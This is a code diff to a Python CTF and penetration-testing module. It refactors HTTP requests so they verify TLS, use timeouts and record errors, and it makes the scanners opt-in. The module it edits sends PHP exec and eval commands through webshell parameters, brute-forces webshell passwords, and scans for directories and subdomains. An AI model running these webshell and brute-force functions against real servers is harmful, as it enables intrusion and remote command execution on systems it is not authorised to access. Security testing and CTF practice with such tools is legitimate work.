@@ -4,9 +4,37 @@ import re
 import time
 import queue
 import threading
-import requests
-from bs4 import BeautifulSoup,Comment
+try:
+    import requests
+except ImportError:
+    requests = None
+try:
+    from bs4 import BeautifulSoup, Comment
+except ImportError:
+    Comment = type("Comment", (), {})
+
+    def BeautifulSoup(*args, **kwargs):
+        raise ImportError("HTML parsing requires the optional 'beautifulsoup4' dependency")
 from qsnctf.auxiliary import read_file_to_list, is_http_or_https_url, normalize_url
+
+DEFAULT_TIMEOUT = 10
+
+
+def _request(method, url, **kwargs):
+    if requests is None:
+        raise ImportError("web features require the optional 'requests' dependency")
+    kwargs.setdefault("timeout", DEFAULT_TIMEOUT)
+    kwargs.setdefault("verify", True)
+    return requests.request(method, url, **kwargs)
+
+
+
+def _queue_items(work_queue):
+    while True:
+        try:
+            yield work_queue.get_nowait()
+        except queue.Empty:
+            return
 
 
 def get_url_title(url, cookies=''):
@@ -22,8 +50,7 @@ def get_url_title(url, cookies=''):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         title = soup.find("title")
@@ -50,8 +77,7 @@ def get_url_description(url, cookies=''):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         description_tag = soup.find('meta', attrs={'name': 'description'})
@@ -77,8 +103,7 @@ def get_url_keywords(url, cookies=''):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         keywords_tag = soup.find('meta', attrs={'name': 'keywords'})
@@ -104,8 +129,7 @@ def get_url_ICP(url, cookies=""):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         icp_tag = soup.find('a', attrs={'href': 'https://beian.miit.gov.cn'})
@@ -131,9 +155,8 @@ def get_url_a_href(url, cookies=""):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     r_list = []
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         a_tags = soup.find_all('a')
@@ -163,9 +186,8 @@ def get_url_img(url, cookies=""):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     r_list = []
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         a_tags = soup.find_all('img')
@@ -195,9 +217,8 @@ def get_url_comment(url, cookies=""):
         "Referer": f"{url}", "Cookie": f"{cookies}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     r_list = []
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, "html.parser")
         # 查找所有的注释节点
@@ -228,8 +249,7 @@ def get_url_time(url):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     end_time = time.time()
     speed = end_time - start_time
     return speed
@@ -248,8 +268,7 @@ def get_url_ico(url):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
-    response = requests.get(url, headers=browser, verify=False)
+    response = _request("GET", url, headers=browser)
     soup = BeautifulSoup(response.text, 'html.parser')
     link_tags = soup.find_all('link', rel='shortcut icon')
     # 遍历 link 标签
@@ -277,13 +296,12 @@ def get_webshell_post(url, key, timeout=5):
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
     try:
-        requests.packages.urllib3.disable_warnings()
         shell = "print('test_a_shell');"
         post_data = f"{key}={shell}"
-        response = requests.post(url, headers=browser, data=post_data, verify=False, timeout=timeout)
+        response = _request("POST", url, headers=browser, data=post_data, timeout=timeout)
         if "test_a_shell" in response.text:
             return True
-    except:
+    except Exception:
         return False
     return False
 
@@ -302,13 +320,12 @@ def get_webshell_get(url, key, timeout=5):
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
     try:
-        requests.packages.urllib3.disable_warnings()
         shell = "print('test_a_shell');"
         params = f"{key}={shell}"
-        response = requests.get(url, headers=browser, params=params, verify=False, timeout=timeout)
+        response = _request("GET", url, headers=browser, params=params, timeout=timeout)
         if "test_a_shell" in response.text:
             return True
-    except:
+    except Exception:
         return False
     return False
 
@@ -327,10 +344,9 @@ def get_exec_webshell_get(url, key, shell):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     sh = f"$output = array();exec('{shell}', $output);print(implode('\n', $output));"
     params = f"{key}={sh}"
-    response = requests.get(url, headers=browser, params=params, verify=False)
+    response = _request("GET", url, headers=browser, params=params)
     return response.text
 
 
@@ -348,10 +364,9 @@ def get_exec_webshell_post(url, key, shell):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     sh = f"$output = array();exec('{shell}', $output);print(implode('\n', $output));"
     data = f"{key}={sh}"
-    response = requests.post(url, headers=browser, data=data, verify=False)
+    response = _request("POST", url, headers=browser, data=data)
     return response.text
 
 
@@ -369,10 +384,9 @@ def get_eval_webshell_get(url, key, shell):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     sh = f"{shell}"
     params = f"{key}={sh}"
-    response = requests.get(url, headers=browser, params=params, verify=False)
+    response = _request("GET", url, headers=browser, params=params)
     return response.text
 
 
@@ -390,15 +404,14 @@ def get_eval_webshell_post(url, key, shell):
         "Referer": f"{url}",
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
         "Te": "trailers", "Connection": "close"}
-    requests.packages.urllib3.disable_warnings()
     sh = f"{shell}"
     data = f"{key}={sh}"
-    response = requests.post(url, headers=browser, data=data, verify=False)
+    response = _request("POST", url, headers=browser, data=data)
     return response.text
 
 
 class DirScan:
-    def __init__(self, url, threadline=10, sleep_time=0, dirlist=None, return_code=None, echo=False, wait=True, cookies='', timeout=1):
+    def __init__(self, url, threadline=10, sleep_time=0, dirlist=None, return_code=None, echo=False, wait=True, cookies='', timeout=1, auto_run=False):
         """
         :param url: Sans URL
         :param threadline: Thread line
@@ -419,13 +432,15 @@ class DirScan:
         self.sleep_time = sleep_time
         self.results = []
         self.results_code = []
+        self.errors = []
         self.check_url = ""
         self.dirlist = dirlist
         if return_code is not None:
             self.return_code = return_code
         else:
             self.return_code = [200, 301, 302, 401, 403, 500]  # 默认不返回404，其余需返回，主要为渗透使用。
-        self.run()
+        if auto_run:
+            self.run()
 
     def scan_dir_list(self):
         if self.dirlist:
@@ -440,10 +455,7 @@ class DirScan:
             raise ValueError("Invalid url")
 
     def scan_dir(self):
-        while not self.q.empty():
-            # 从队列中取出一个路径
-            path = self.q.get()
-            requests.packages.urllib3.disable_warnings()
+        for path in _queue_items(self.q):
             browser = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                 "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
@@ -452,7 +464,7 @@ class DirScan:
                 "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
                 "Te": "trailers", "Connection": "close"}
             try:
-                response = requests.get(self.url + path, headers=browser, verify=False, timeout=self.timeout)
+                response = _request("GET", self.url + path, headers=browser, timeout=self.timeout)
                 time.sleep(self.sleep_time)
                 # 将符合条件的扫描结果添加到results列表
                 if response.status_code in self.return_code:
@@ -460,8 +472,8 @@ class DirScan:
                     self.results_code.append(f"{self.url}{path} {response.status_code}")
                     if self.print_list:
                         print(f"{self.url}{path} {response.status_code}")  # print response
-            except:
-                pass
+            except Exception as exc:
+                self.errors.append((path, str(exc)))
             # 完成之后将任务标记为完成
             self.q.task_done()
 
@@ -480,7 +492,7 @@ class DirScan:
 
 class UrlScan:
     # 网页存活扫描
-    def __init__(self, url_list, threadline=10, sleep_time=0, return_code=None, echo=False, wait=True, timeout=1, cookies=''):
+    def __init__(self, url_list, threadline=10, sleep_time=0, return_code=None, echo=False, wait=True, timeout=1, cookies='', auto_run=False):
         """
         :param url_list: Sans URL
         :param threadline: Thread line
@@ -500,18 +512,17 @@ class UrlScan:
         self.sleep_time = sleep_time
         self.results = []
         self.results_code = []
+        self.errors = []
         self.results_title = []
         if return_code is not None:
             self.return_code = return_code
         else:
             self.return_code = [200, 301, 302, 401, 403, 404, 500]  # 这里默认404是需要返回的，为了验证URL的状态
-        self.run()
+        if auto_run:
+            self.run()
 
     def scan_url(self):
-        while not self.q.empty():
-            # 从队列中取出一个路径
-            url = self.q.get()
-            requests.packages.urllib3.disable_warnings()
+        for url in _queue_items(self.q):
             browser = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                 "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
@@ -520,7 +531,7 @@ class UrlScan:
                 "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
                 "Te": "trailers", "Connection": "close"}
             try:
-                response = requests.get(url, headers=browser, verify=False, timeout=self.timeout)
+                response = _request("GET", url, headers=browser, timeout=self.timeout)
                 time.sleep(self.sleep_time)
                 # 将符合条件的扫描结果添加到results列表
                 if response.status_code in self.return_code:
@@ -539,8 +550,8 @@ class UrlScan:
                         print(f"{url} {response.status_code} {title}")  # print response
                     elif self.print_list and response.status_code != 200:
                         print(f"{url} {response.status_code}")
-            except:
-                pass
+            except Exception as exc:
+                self.errors.append((url, str(exc)))
             # 完成之后将任务标记为完成
             self.q.task_done()
 
@@ -557,7 +568,7 @@ class UrlScan:
 
 
 class DomainScan:
-    def __init__(self, domain, threadline=10, sleep_time=0, domainlist=None, return_code=None, echo=False, wait=True, timeout = 1):
+    def __init__(self, domain, threadline=10, sleep_time=0, domainlist=None, return_code=None, echo=False, wait=True, timeout=1, auto_run=False):
         """
         :param domain: Sans domain
         :param threadline: Thread line
@@ -577,13 +588,15 @@ class DomainScan:
         self.sleep_time = sleep_time
         self.results = []
         self.results_code = []
+        self.errors = []
         self.check_url = ""
         self.domainlist = domainlist
         if return_code is not None:
             self.return_code = return_code
         else:
             self.return_code = [200, 301, 302, 401, 403, 500]  # 默认不返回404，其余需返回，主要为渗透使用。
-        self.run()
+        if auto_run:
+            self.run()
 
     def scan_domain_list(self):
         if self.domainlist:
@@ -594,10 +607,7 @@ class DomainScan:
             self.domainlist = read_file_to_list(file_path)
 
     def scan_domain(self):
-        while not self.q.empty():
-            # 从队列中取出一个路径
-            domain = self.q.get()
-            requests.packages.urllib3.disable_warnings()
+        for domain in _queue_items(self.q):
             browser = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                 "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
@@ -606,7 +616,7 @@ class DomainScan:
                 "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
                 "Te": "trailers", "Connection": "close"}
             try:
-                response = requests.get(f"http://{domain}.{self.domain}/", headers=browser, verify=False, timeout=self.timeout)
+                response = _request("GET", f"http://{domain}.{self.domain}/", headers=browser, timeout=self.timeout)
                 time.sleep(self.sleep_time)
                 # 将符合条件的扫描结果添加到results列表
                 if response.status_code in self.return_code:
@@ -626,8 +636,8 @@ class DomainScan:
                     elif self.print_list and response.status_code != 200:
                         print(f"http://{domain}.{self.domain}/ {response.status_code}")
                     # 完成之后将任务标记为完成
-            except:
-                pass
+            except Exception as exc:
+                self.errors.append((domain, str(exc)))
             self.q.task_done()
 
     def run(self):
@@ -644,7 +654,7 @@ class DomainScan:
 
 
 class WebShellCracking:
-    def __init__(self, url, threadline=10, sleep_time=0, passlist=None, mode="POST"):
+    def __init__(self, url, threadline=10, sleep_time=0, passlist=None, mode="POST", auto_run=False):
         """
         :param url: Shell URL
         :param threadline: thread line
@@ -661,7 +671,8 @@ class WebShellCracking:
         self.results = ''
         self.passlist = passlist
         self.return_code = [200, 301, 302, 401, 403, 500]  # 默认不返回404，其余需返回，主要为渗透使用。
-        self.run()
+        if auto_run:
+            self.run()
 
     def scan_pass_list(self):
         if self.passlist:
@@ -672,18 +683,14 @@ class WebShellCracking:
             self.passlist = read_file_to_list(file_path)
 
     def Cracking_webshell_POST(self):
-        while not self.q.empty():
-            # 从队列中取出密码
-            key = self.q.get()
+        for key in _queue_items(self.q):
             if get_webshell_post(self.url, key):
                 self.results = key
             time.sleep(self.sleep_time)
             self.q.task_done()
 
     def Cracking_webshell_GET(self):
-        while not self.q.empty():
-            # 从队列中取出密码
-            key = self.q.get()
+        for key in _queue_items(self.q):
             if get_webshell_get(self.url, key):
                 self.results = key
             time.sleep(self.sleep_time)
